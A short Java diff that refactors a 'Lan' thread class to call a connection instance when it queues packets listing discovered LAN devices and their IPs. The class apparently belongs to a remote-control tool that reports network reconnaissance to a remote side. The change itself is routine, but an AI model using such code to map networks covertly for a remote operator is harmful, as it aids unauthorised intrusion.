@@ -32,17 +32,17 @@ public class Lan extends Thread {
 						}
 						preader.close();
 
-						Connection.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip));
+						Connection.instance.addToSendQueue(new Packet49LanDevices(line, ip == null ? "Unknown" : ip));
 					}
 				}
 				reader.close();
-				Connection.addToSendQueue(new Packet49LanDevices("DONE", null));
+				Connection.instance.addToSendQueue(new Packet49LanDevices("DONE", null));
 			} else {
 				throw new Exception();
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
-			Connection.addToSendQueue(new Packet49LanDevices("FAIL", null));
+			Connection.instance.addToSendQueue(new Packet49LanDevices("FAIL", null));
 		}
 	}
 
